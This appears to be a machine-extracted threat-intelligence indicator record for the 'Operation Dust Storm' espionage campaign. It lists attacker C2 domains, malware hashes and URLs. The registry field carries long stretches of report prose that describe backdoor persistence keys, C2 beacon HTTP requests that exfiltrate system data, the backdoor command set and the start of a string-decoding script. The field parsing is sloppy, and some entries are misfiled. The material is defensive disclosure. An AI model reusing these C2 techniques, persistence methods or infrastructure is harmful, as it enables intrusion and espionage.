{"rule_id": 830, "name": "Op_Dust_Storm_Report", "description": "-", "references": [], "File_Names": ["ectscorp.net", "wdd.ocx", "spacedevcoop.com", "tmp.kbm", "7766.org", "sslmails.com", "msnt.dll", "X\u00fc\u00b3.pP", "faq.htm", "imzone.in", "DeployJava.js", "imbbs.in", "wih365.com", "gmnspace.com", "toisengyo.jp", "tao123.biz", "rtcomdll.dll", "uuvod.net", "ssl.proj", "microbing.oicp", "Erido.jpg", "songwol.co", "glkcorp.com", "deployJava.js", "exemail.com", "athmgmt.dll", "95nb.co", "8800.org", "pic.html", "dpc.com", "www.oray", "moviestops.com", "ow.com", "microwmies.oicp", "adobeus.com", "mocrosoftds.xicp", "2016757.aspx", "8866.org", "Moran.pdf", "nexon.com", "t2svzmp.kbp", "amazonwikis.com", "www.zlib", "honeywells.tk", "document.body", "java.ree", "exemail.net", "deployjava.js", "adobekr.com", "www.noip", "win.exe", "glkjcorp.com", "hkabinc.com", "mobile.yqby", "wordoscorp.com", "2.hiv", "sfcorporation.com", "tavis.tw", "rasctl.dll", "elecarrow.com", "naedco.com", "units.html", "cryptpol.dll", "gnway.net", "tomshardpc.com", "www.jcsh", "projectscorp.net"], "MD5_Hashes": ["4e6cd3aa32b091045dd6739c637acfd5", "83399bd0e09b2c2886a58890bbbf6a8d", "85b80ed2aa871257f293a074d80eb64a", "bd56d32fbda703a98c87689c92325d90", "bbc6d1b87352c3ae109b2c6c97baaf75", "0b596b54e65ed5ab2c80b8bc259ca5dc", "621ec74ec70c0cf1703f5f5adab23a67", "edca4f063161b25bfe0c90b378b9c19c", "63bd3f80387e3f2c7130bc3b36474c24", "38238f14d63d14075824cc9afd9a3b84", "12038957e3956bf8682362044ddccf42", "580c7ed2b624a0dfa749909d3e110704", "65bd310663d30fb6fe3532ad45d57b8a", "74ff3b246fde30bb3c14483279d4b003", "df9b9c2f1408ac440458196a9e690db6", "4241a9371023e7452475117ff1fcd672", "62dab56bf1943b5e0c73ff2b2e41f876", "2978c6cfff1754c85a4a22b6a72dc9e6"], "SHA1_Hashes": [], "SHA256_Hashes": [], "Registry_Entries": ["HKCU\\Software\\bkfouerioyou\n\n\u2022 Creates the value StubPath pointing to %AppData%\\{Unique Identifier}\\msdtc.exe\n\n\u2022 Will create one of these registry keys for persistence:\n\n\u2022 HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{6afa8072-b2b1-31a8-b5c1- \n\n{Unique Identifier} \u2013 First 12bytes\n\n\u2022 HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3BF41072-B2B1-31A8-B5C1- \n\n{Unique Identifier} \u2013 First 12bytes\n\nNETWORK-BASED INDICATORS \nThe  malware  will  make  DNS  requests  for  the  domains  \u201csmtp.adobekr.com\u201d  and  \u201cmail.glkjcorp.com\u201d  or  \u201cauto.glkjcorp.com\u201d. \nBoth  samples  were  configured  to  communicate  first  to  \u201csmtp.adobekr.com\u201d  using  the  Misdat  network  protocol  described \nabove over TCP port 80, 443, and 25. If a response was not received from the C2, the samples would fallback to the secondary \nHTTP protocol and communicate to the alternate C2 using the same TCP ports.\n\nPOST /index.asp HTTP/1.1 \nAccept: Accept: */*, /index.asp, mail.glkjcorp.com \nContent-Type: application/x-www-form-urlencoded \nUser-Agent: FirefoxApp \nHost: mail.glkjcorp.com \nContent-Length: 334 \nCache-Control: no-cache\n\nid=e263314342d1f1b9&type=post&stype=info&data=V2luZG93cyBYUA0KTUFMV0FSRS9j-\ndWNrb28vQWRta W5pc3RyYXRvcnMNCkNyZWF0ZSBVc2VyIExvc3RfZTI2MzMxI-\nFN1Y2Nlc3MuDQpDcmVhdGUgRGlyIFN1Y2Nlc3 MuDQpXcml0ZSBSZWdLZXkgRX-\nJyb3IuDQpGaWxlU3lzdGVtIDogTlRGUw0KU3lzdGVtIFJ1blRpbWU6MCBkYXkwI \nGhvdXJzMTUgbWludXRlcw0KDQoNCiBDb3VudCA9IDANCk9wZW5TY01hbmFnZXIgT0suDQo= \n\nThe initial POST request always used the static User-Agent \u201cFirefoxApp\u201d and contained operating system information, user \ninformation, the results of several permissions tests, the file system, and system uptime. If the backdoor did not receive a \nresponse, it would then try to communicate the same base64 encoded information in the URI of a GET request.\n\nFigure 11: Initial S-Type Beacon\n\nWindows XP \n{Hostname}/{Username}/Administrators \nCreate User Lost_e26331 Success. \nCreate Dir Success. \nWrite RegKey Error. \nFileSystem : NTFS \nSystem RunTime:0 day0 hours15 minutes \nCount = 0 \nOpenScManager OK.\n\nFollow-on requests used the User-Agent of the default browser on the system as evidenced below.\n\nFigure 12: Contents of the Decoded POST Request from the Figure Above\n\nGET /index.asp?mmid=e263314342d1f1b9 HTTP/1.1 \nAccept: */* \nAccept-Language: en-us \nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; \n.NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR \n1.1.4322) \nAccept-Encoding: gzip, deflate \nHost: mail.glkjcorp.com \nConnection: Keep-AliveOpenScManager OK.\n\nFigure 13: Follow-on HTTP Traffic\n\nThe id and mmid fields in the figures above both used the first 16 characters of the unique identifier created for the mutex. The \nMisdat protocol provided the attacker most of the features of a full-fledged backdoor, while the secondary protocol appeared \nto primarily be used as an update mechanism to load additional malware on the system. \n\n10\n\nOPERATION DUST STORM\n\nOPERATION DUST STORM\n\n11\n\n\fNETWORK-BASED INDICATORS\nDETAILS\nThe backdoor could be executed with three different switches, \u201c/ok\u201d, \u201c/Start\u201d, or \u201c/fuck\u201d. These switches affected the context \nunder which the process would be run and whether or not the binary would delete itself once executed.\n\nSwitch\n\nDescriptive Purpose\n\nSelf-Delete\n\n/ok\n\nExecuted the malware directly under the current running process using the context \nof the user that started the application (can be system).\n\n/Start\n\n/fuck\n\nNo\n\nExecuted the malware under explorer.exe in the context of whatever user executed \nthe application (can be system). This was the switch used by the malware when \nsetting persistence in the registry.\n\nForced execution of the malware under explorer.exe in the context of the user \nrunning explorer.exe (scanned active processes and located the explorer process).\n\nStarted the malware in a process called msdtc.exe which ran as an orphaned \nprocess under explorer.exe\n\nNo\n\nNo\n\nNo\n\nYes\n\nFigure 14: Description of Command Line Execution Switches for the Backdoor\n\nThe backdoor attempted to run a number of tests to determine the privilege level of the compromised user, including whether \nor not a user can be added to the system, whether a directory can be created in the %System% folder, and whether the user can \naccess the service manager via a call to \u201cOpenSCManagerA\u201d. \n\nThe user test was performed by utilizing the NetUserAdd and NetUserDel Windows APIs; the test attempted to create the \ntemporary user \u201cLost_{Unique Identifier}\u201d with the password \u201cfuck~!@6{Unique Identifier}\u201d. If the secondary network protocol \nwas activated, the backdoor would also execute two commands via the command interpreter to gather system information: \n\u201ccmd.exe /c ipconfig /all\u201d and \u201ccmd.exe /c net user {Username}\u201d. It would temporarily write the output of these commands to \nthe files, \u201c%AppData%\\{Unique Identifier}\\HOSTRURKLSR\u201d and \u201c%AppData%\\{Unique Identifier}\\NEWERSSEMP\u201d respectively. \nThis information was then base64 encoded and transmitted to the C2 server within the URI of a GET request. The S-Type \nnetwork protocol is described in greater detail below. Also of note is that the backdoor would continue to attempt to beacon to \n\u201csmtp.adobekr.com\u201d on port 25 even if communication to the secondary C2 could be established.\n\nThe configuration information contained within these backdoors could be decoded using the same script provided in Figure 8.\n\nFILE CHARACTERISTICS\n\nSHA256\n\nNetwork Callbacks\n\nIdentifier\n\nb1aed59dc59a4ef4c7d2b6e67983e4867 \ne04ba35c42372eb3b6ad969bd6a6041\n\nPrimary: smtp.adobekr.com\nSecondary: hxxp://mail.glkjcorp.com/index.asp\nTCP Port: 80, 443, 25\n\n93c1c7a666833f5f68d2315dc014dc6c24 \n46c91c848130e228e84376b0aaf441\n\nPrimary: smtp.adobekr.com\nSecondary: hxxp://auto.glkjcorp.com/us/index.asp\nTCP Port: 80, 443, 25\n\nHLD\n\nGKB\n\nFigure 15: Secondary C2 Servers and Campaign Identifiers by Sample\n\nS-TYPE BACKDOOR (2013-2014)\nAfter experimenting with a hybrid of the Misdat and S-Type backdoors, in 2013 Operation Dust Storm abandoned the earlier \nMisdat network protocol entirely. This was likely a direct result of the demonstrated effectiveness of an HTTP-based protocol \nfor command and control, or simply an adaptation to more corporations leveraging web-based proxies. All samples identified \nwere programmed using Borland Delphi and made use of custom classes to implement common backdoor functionality. The \nmajority of samples SPEAR identified in 2013 were packed with UPX version 3.03, while later 2014 variants were not.\n\nFILE CHARACTERISTICS\n\nSHA256\n\nFile Size\n\nResource Compile Time\n\n83399bd0e09b2c2886a58890bbbf6a8d \n4e6cd3aa32b091045dd6739c637acfd5\n\n32,768 Bytes\n\nHLD\n\nFigure 16: File Characteristics of the S-Type Backdoor\n\nHOST-BASED INDICATORS\nVolatile Evidence:\n\u2022 May create a mutex named \u201c{Unique Identifier}_KB10B2D1_CIlFD2C\u201d\n\n\u2022 May create a temporary user on the system named \u201cLost_{Unique Identifier}\u201d with the password \u201cpond~!@6\u201d{Unique \n\nIdentifier}\u201d\n\n\u2022 May create the folder %System%\\{Unique Identifier} temporarily\n\nFile System Modifications:\n\u2022 The backdoor will copy itself to %CommonFiles%\\{Unique Identifier}\\msdtc.exe while other observed variants used \n\n%Appdata%\\{Unique Identifier}\\msdtc.exe\n\n\u2022 May create the file %HOMEPATH%\\Start Menu\\Programs\\Startup\\Realtek {Unique Identifier}.lnk \n\u2022 This shortcut will point to the msdtc.exe file in %CommonFiles% with the \u201c/Start\u201d switch\n\n\u2022 May create temporary files in %temp%\\{random numbers}.tmp\n\nRegistry Modifications:\n\u2022 Will temporarily create the registry key HKCU\\SOFTWARE\\AdobeSoft \n\n\u2022 May create the registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ IMJPMIJ8.1{3 characters of \n\nUnique Identifier}\n\n\u2022 May create the Registry keys:\n\n\u2022 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\ssl.projectscorp.net\\http\n\u2022 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\ssl.projectscorp.net\\https\n\nNETWORK-BASED INDICATORS\nThe backdoor communicated to ", "HKLM\\System\\CurrentControlSet\\\nServices\\RemoteAccess\\RouterManagers\\IP\\DllPath\u201d \nyielded  numerous  other  pieces  of  malware;  however, \nSPEAR was only able to identify one of the group\u2019s samples \nthat took advantage of this. Several new domains were \nalso registered in 2014 to support expanding operations.\n\nRegistration Email Address\n\nDomain Name\n\nDate First Registered\n\nysymsq (at) 126.com\n\nmyexmail (at) aol.com\n\nmyexmail (at) aol.com\n\nhkabinc.com\n\nexemail.com\n\nsslmails.com\n\nMarch 26, 2014\n\nMarch 26, 2014\n\nMarch 6, 2015\n\nFigure 5: C2 Domains Registered in 2014 and 2015\n\nHere and Now: Companies Compromised \nActivity in 2015 was significantly more interesting, and prompted SPEAR \nto begin studying Operation Dust Storm\u2019s other activities. SPEAR identified \na number of second-stage backdoors with hardcoded proxy addresses and \ncredentials. These proxy addresses revealed the attacker had compromised \na  number  of  Japanese  companies  involved  in  power  generation,  oil  and \nnatural gas, construction, finance, and transportation. \n\nIn  one  case  that  transpired  in  early  February  2015, \nSPEAR  was  able  to  recover  the  second-stage  implant \ndelivered  by  a  variant  of  the  S-Type  backdoor  shortly \nfollowing  its  initial  reconnaissance.  What  caught  our \nattention  was  the  fact  that  the  victim  was  part  of  the \ninvestment  arm  of  a  major  Japanese  automaker.  The \nattack  came \njust  two  weeks  before  eleven  unions \nrepresenting  Japan\u2019s  autoworkers  demanded  a  monthly \n\nraise  of  six  thousand  yen.  (http://www.bloomberg.com/\nnews/articles/2015-02-18/japan-auto-workers-seek-\npay-raise-to-share-in-record-car-profits)\n\nThe second-stage implants were also programmed and \ncompiled  using  Microsoft  Visual  Studio  6,  an  archaic \nversion  of  Visual  Studio  that  seems  to  be  preferred  by \nmalware authors. Despite using an old version of Visual \n\n4\n\nOPERATION DUST STORM\n\nOPERATION DUST STORM\n\n5\n\n\fStudio, the backdoor is well designed by comparison and \nprovides a full suite of functionality to the attacker. \n\nNo  antivirus  vendors  seem  to  reliably  detect  most  of \nthe variants SPEAR identified.\n\nPerhaps  even  more  interesting  was  the  fact  that  the \ngroup adopted and eventually customized several Android \nbackdoors to suit their purposes in the beginning of 2015. \nThe  group  rapidly  expanded  their  mobile  operations  in \nMay  2015.  The  initial  backdoors  were  relatively  simple, \nand  would  continually  forward  all  SMS  messages  and \ncall  information  back  to  the  C2  servers.  Later  variants \nbecame much more complex, and included the ability to \nenumerate  and  exfiltrate  specific  files  directly  from  the \ninfected devices. \n\nAll of the identified victims for the Android Trojans resided \nin  Japan  or  South  Korea.  The  infrastructure  to  support \n\nthe  Android  campaigns  was  massive  in  comparison  to \nprevious  operations.  More  than  two  hundred  domains \nhave  been  identified  to  date.  SPEAR  plans  to  release \nmore information regarding this threat shortly.\n\nSPEAR  discovered  two  more  waves  of  attacks  that \nstarted in July 2015 and October 2015. Interestingly, one \nof  the  primary  targets  was  a  Japanese  subsidiary  of  a \nSouth  Korean  electric  utility.  Similarly,  SPEAR  identified \na  separate  intrusion  into  a  major  Japanese  oil  and  gas \ncompany.  The  exact  motivations  for  this  particular \nattack  were  unclear;  however,  if  this  attack  coincided \nwith all  previous operations,  the most likely  goals were \nreconnaissance and long-term espionage. \n\nCONCLUSION\nAt this time, SPEAR does not believe the attacks were meant to be destructive or disruptive. However, our team believes that \nattacks of this nature on companies involved in Japanese critical infrastructure and resources are ongoing and are likely to \ncontinue to escalate in the future.\n\nIt\u2019s clear from SPEAR\u2019s research that Operation Dust Storm has slowly evolved over time to become increasingly effective. \nEarly operations were extremely blunt, relatively unsophisticated, and readily picked up by the security industry. As the group \nbecame more and more focused on Japan, less and less of their tactics and malware appeared in reports or write-ups. The \ntargets identified escalated both in size and in the scope of affected industries. \n\nAs a result, SPEAR felt obligated to share with the community and public what was discovered recently, to hopefully stunt the \nattackers\u2019 progress for a time. SPEAR has been closely following the aftermath of public reporting. We have decided that even \nthough disclosure often forces attackers to change, it also enables defenders to better detect and expel \u201creal\u201d threats from \ntheir environments. \n\nSPEAR would like to thank the Japanese Computer Emergency Response Team (JP-CERT) for their cooperation, assistance, and \ntime during our investigation.\n\nNOTE:  A  large  number  of  the  older  Misdat  domains  were  sinkholed  by  a  private  entity  in  late  December  2015.  The \ndomains  currently  point  to  the  IP  address  \u201c58.158.177.102\u201d.  If  anyone  has  more  information  or  knows  who  operates \nthis sinkhole, please contact us at: threat-intel [at] cylance [dot] com.\n\nIMPLANT ANALYSIS\nMISDAT BACKDOOR (2010-2011)\nMost early samples of Misdat were not packed; however, following what appeared to be heightened awareness by security \nvendors,  samples  in  late  2010  and  2011  were  typically  packed  with  the  executable  packer,  UPX  version  3.03  (hxxp://upx.\nsourceforge.net/). All of the Misdat samples SPEAR identified were programmed using Borland Delphi, which will mangle the \ndefault PE compile timestamp of a file; as a result, SPEAR was forced to use the resource compile times of samples to get a \nbetter idea of when the actual backdoors were compiled.\n\nFILE CHARACTERISTICS\n\nSHA256\n\n63bd3f80387e3f2c7130bc3b36474c24 \nedca4f063161b25bfe0c90b378b9c19c\n\n74ff3b246fde30bb3c14483279d4b003 \n12038957e3956bf8682362044ddccf42\n\n38238f14d63d14075824cc9afd9a3b84 \ndf9b9c2f1408ac440458196a9e690db6\n\n2978c6cfff1754c85a4a22b6a72dc9e60b-\n596b54e65ed5ab2c80b8bc259ca5dc\n\n580c7ed2b624a0dfa749909d3e110704 \n65bd310663d30fb6fe3532ad45d57b8a\n\n861edc857e53ff072947c2befc3c372c9 \na954a7de5c48c53b99c64ff99b69dbd\n\n4241a9371023e7452475117ff1fcd672 \n62dab56bf1943b5e0c73ff2b2e41f876\n\n File Size\n\n Resource Compile Time\n\n67,584 Bytes\n\n01-12-2010 19:09:38 UTC\n\n44,544 Bytes\n\n07-07-2010 19:16:28 UTC\n\n22,016 Bytes\n\n07-07-2010 19:16:28 UTC\n\n22,016 Bytes\n\n08-16-2011 00:27:02 UTC\n\n43,008 Bytes\n\n08-16-2011 00:27:02 UTC\n\n43,008 Bytes\n\n08-16-2011 00:27:02 UTC\n\n23,040 bytes\n\n10-21-2011 20:05:48 UTC\n\nFile characteristics and resource compile times of known Misdat samples.\n\nHOST-BASED INDICATORS\nVolatile Evidence:\n\u2022 Will create a 32-bit Mutex based upon the MD5 hash of a unique string comprising the volume serial number, decrypted \n\nnetwork configuration data, and encoded campaign identifier\n\nFile System Modifications:\n\u2022 The backdoor will copy itself to %CommonFiles%\\{Unique Identifier}\\msdtc.exe\n\n\u2022 It may attempt to open then delete the file C:\\2.hiv, c:\\t2svzmp.kbp, or c:\\tmp.kbm depending on the sample. Later \n\nversions from 2011 all used c:\\t2svzmp.kbp\n\nRegistry Modifications:\n\u2022 The malware may create the registry key HKCU\\Software\\dnimtsoleht\\StubPath, HKCU\\Software\\snimtsOleht\\StubPath, \n\nor HKCU\\Software\\Backtsaleht\\StubPath for persistence\n\n\u2022 In SPEAR\u2019s tests, StubPath always pointed to the newly created msdtc.exe binary within the %CommonFiles% directory, \n\nwith either the \u201c/ok\u201d or \u201c/start\u201d switch depending on the sample\n\n\u2022 May create the Registry Key HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed. Components\\{3bf41072-b2b1-21c8-\nb5c1-bd56d32fbda7} or HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3ef41072-a2f1-21c8-c5c1-\n70c2c3bc7905} \n\n6\n\nOPERATION DUST STORM\n\nOPERATION DUST STORM\n\n7\n\n\fNETWORK-BASED INDICATORS\nObserved network traffic was always base64 encoded plain text over a raw socket to common ports like 80, 443, or 1433. A \nsample initial beacon packet is shown below.\n\nlogon|{Hostname}|Windows XP|100112|bd56d32fbda703a98c87689c92325d90|\n\nFigure 6: Initial Beacon Packet Base64 Decoded\n\nThe  string  \u201clogon\u201d  always  preceded  any  other  information.  In  the  instance  above,  the  hostname  of  the  victim\u2019s  system, \noperating system version, unique sample identifier (SPEAR believes this is a date: 1/12/2010), as well as the unique MD5 \nused for the mutex were sent to the server. Once it registers with the C2, the backdoor sends the string \u201cYWN0aXZlfA==\u201d \nwhich decodes to \u201cactive|\u201d. The backdoor will then continue to send that string and wait until it receives one of the following \ncommands from the C2 server:\n\nCommand\n\nFunction\n\nshell\n\nfiles\n\nupload\n\ndown\n\nrestart\n\ncloseos\n\ndclose\n\nuclose\n\nunintall\n\nInitiates a new connection that provides shell functionality to the attacker to \nexecute commands. Subcommands include shellstart, command and stop.\n\nInitiates a new connection that provides file management and enumeration \ncapabilities to the attacker. Subcommands include filelist, dirlist, driver (enu-\nmerates logical drives), renamefile, delete, run, open and stop.\n\nProvides the ability to upload files directly to the C2.\n\nProvides the ability to download files from the C2.\n\nRestarts the victim system through a call to the Windows API ExitWindowsEx.\n\nShuts down the system via ExitWindowsEx API.\n\nCloses the socket connection to the C2.\n\nAppears to do the same as the dclose command.\n\nDeletes the Active Setup registry key and deletes the backdoor before termi-\nnating the process.\n\nFigure 7: Network Commands Supported by the Misdat Backdoor\n\nDETAILS\nThe  backdoors  were  relatively  simple  and  provided  the  attacker  the  ability  to  upload  and  download  files,  manipulate  and \nenumerate files, execute shell commands, disconnect from the C2, uninstall the backdoor, and shutdown or restart the system. \nThe backdoors could also potentially take the command line parameters \u201c/ok\u201d or \u201c/start\u201d; the switches changed the user context \nunder which the process runs. If no switch was provided when executed, the backdoor will copy itself to \u201c%CommonFiles%\\\n{Unique Identifier}\\msdtc.exe\u201d, where the unique identifier is the first ten characters of the MD5 hash used as the mutex. It will \nthen configure one of the Active Setup and associated registry keys above to establish persistence on the system. \n\nSPEAR identified and reversed the encoding mechanism used for obfuscating network callback information and what appeared \nto be a unique campaign identifier. The following script can be used to decode these obfuscated strings.\n\ndef decode_chars(a, b): \n    return chr((26 * (ord(a) - ord('A'))) + (ord(b) - ord('A')))\n\ndef decode(s): \n\nrolling_key = 0x783 \nresult = "], "URLs": ["http://www.symantec.com/connect/", "https://www.fireeye.com/blog/threat-research/2013", "http://www.pubyun.com/)", "http://www.noip.com),", "https://www.usenix.org/system/files/login/articles/", "http://www.bloomberg.com/", "http://www.ahnlab.com/kr/site/", "http://www.zlib.net/).", "http://asec.ahnlab."], "weight": 0.0}